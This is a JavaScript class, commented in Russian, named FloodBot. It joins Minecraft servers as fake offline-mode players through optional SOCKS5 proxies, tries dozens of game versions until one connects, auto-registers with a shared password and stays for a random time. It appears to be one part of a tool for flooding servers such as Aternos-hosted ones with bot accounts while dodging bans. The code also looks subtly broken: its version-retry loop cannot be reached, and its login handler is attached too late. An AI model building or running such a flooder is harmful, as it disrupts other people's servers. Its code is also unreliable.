// ========== КЛАСС MINECRAFT БОТА С АВТО-ОПРЕДЕЛЕНИЕМ ВЕРСИИ ==========
class FloodBot {
    constructor(name, host, port, proxy = null, onComplete = null) {
        this.name = name;
        this.host = host;
        this.port = port;
        this.proxy = proxy;
        this.onComplete = onComplete;
        this.bot = null;
        this.running = false;
        this.success = false;
    }

    // Пытается подключиться с разными версиями
    async tryConnectWithVersions() {
        // Список популярных версий для Aternos
        const versions = [
            '1.20.4', '1.20.2', '1.20.1', '1.20',
            '1.19.4', '1.19.3', '1.19.2', '1.19.1', '1.19',
            '1.18.2', '1.18.1', '1.18',
            '1.17.1', '1.17',
            '1.16.5', '1.16.4', '1.16.3', '1.16.2', '1.16.1', '1.16',
            '1.15.2', '1.15.1', '1.15',
            '1.14.4', '1.14.3', '1.14.2', '1.14.1', '1.14',
            '1.13.2', '1.13.1', '1.13',
            '1.12.2', '1.12.1', '1.12',
            '1.11.2', '1.11.1', '1.11',
            '1.10.2', '1.10.1', '1.10',
            '1.9.4', '1.9.3', '1.9.2', '1.9.1', '1.9',
            '1.8.9', '1.8.8', '1.8.7', '1.8.6', '1.8.5', '1.8.4', '1.8.3', '1.8.2', '1.8.1', '1.8'
        ];

        console.log(`🔍 [${this.name}] Пробую определить версию сервера...`);

        // Сначала пробуем авто-определение
        try {
            const options = {
                host: this.host,
                port: this.port,
                username: this.name,
                offline: true,
                viewDistance: 'tiny'
            };

            if (this.proxy) {
                const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                options.agent = new SocksProxyAgent(proxyUrl);
            }

            this.bot = mineflayer.createBot(options);

            return new Promise((resolve) => {
                const timeout = setTimeout(() => {
                    if (this.bot) {
                        this.bot.end();
                    }
                    resolve(false);
                }, 10000);

                this.bot.once('login', () => {
                    clearTimeout(timeout);
                    console.log(`✅ [${this.name}] Авто-определение сработало!`);
                    resolve(true);
                });

                this.bot.once('error', (err) => {
                    clearTimeout(timeout);
                    console.log(`❌ [${this.name}] Авто-определение не сработало:`, err.message);
                    resolve(false);
                });
            });
        } catch (err) {
            console.log(`❌ [${this.name}] Ошибка авто-определения`);
        }

        // Если авто-определение не сработало, пробуем все версии по порядку
        console.log(`🔄 [${this.name}] Перебираю версии...`);

        for (const version of versions) {
            try {
                console.log(`🔄 [${this.name}] Пробую версию ${version}...`);
                
                const options = {
                    host: this.host,
                    port: this.port,
                    username: this.name,
                    offline: true,
                    version: version,
                    viewDistance: 'tiny'
                };

                if (this.proxy) {
                    const proxyUrl = `socks5://${this.proxy.username ? this.proxy.username + ':' + this.proxy.password + '@' : ''}${this.proxy.host}:${this.proxy.port}`;
                    options.agent = new SocksProxyAgent(proxyUrl);
                }

                this.bot = mineflayer.createBot(options);

                const success = await new Promise((resolve) => {
                    const timeout = setTimeout(() => {
                        if (this.bot) {
                            this.bot.end();
                        }
                        resolve(false);
                    }, 5000);

                    this.bot.once('login', () => {
                        clearTimeout(timeout);
                        console.log(`✅ [${this.name}] Подключился с версией ${version}!`);
                        resolve(true);
                    });

                    this.bot.once('error', (err) => {
                        clearTimeout(timeout);
                        if (err.message.includes('version')) {
                            console.log(`❌ [${this.name}] Версия ${version} не подходит`);
                        }
                        resolve(false);
                    });
                });

                if (success) {
                    return true;
                }

                if (this.bot) {
                    this.bot.end();
                    this.bot = null;
                }

                await new Promise(resolve => setTimeout(resolve, 1000));

            } catch (err) {
                console.log(`❌ [${this.name}] Ошибка с версией ${version}:`, err.message);
            }
        }

        return false;
    }

    async start() {
        this.running = true;
        
        const connected = await this.tryConnectWithVersions();
        
        if (!connected) {
            console.log(`❌ [${this.name}] Не удалось подключиться ни с одной версией`);
            this.success = false;
            this.stop();
            return;
        }

        // Настраиваем обработчики после успешного подключения
        this.bot.once('login', () => {
            console.log(`✅ [${this.name}] Зашел на сервер`);
            this.success = true;

            setTimeout(() => {
                if (this.bot) {
                    this.bot.chat(`/register ${CONFIG.botPassword} ${CONFIG.botPassword}`);
                    setTimeout(() => {
                        if (this.bot) {
                            this.bot.chat(`/login ${CONFIG.botPassword}`);
                        }
                    }, 1000);
                }
            }, 2000);

            const sessionTime = Math.floor(
                Math.random() * (CONFIG.maxSessionTime - CONFIG.minSessionTime) + 
                CONFIG.minSessionTime
            );
            
            console.log(`⏱️ [${this.name}] Будет на сервере ${sessionTime} сек`);
            
            setTimeout(() => this.stop(), sessionTime * 1000);
        });

        this.bot.on('error', (err) => {
            console.log(`❌ [${this.name}] Ошибка:`, err.message);
            this.success = false;
            this.stop();
        });

        this.bot.on('end', () => {
            console.log(`👋 [${this.name}] Вышел с сервера`);
            this.stop();
        });
    }

    stop() {
        if (this.running) {
            this.running = false;
            if (this.bot) {
                this.bot.end();
                this.bot = null;
            }
            if (this.onComplete) {
                this.onComplete(this.success);
            }
        }
    }
}
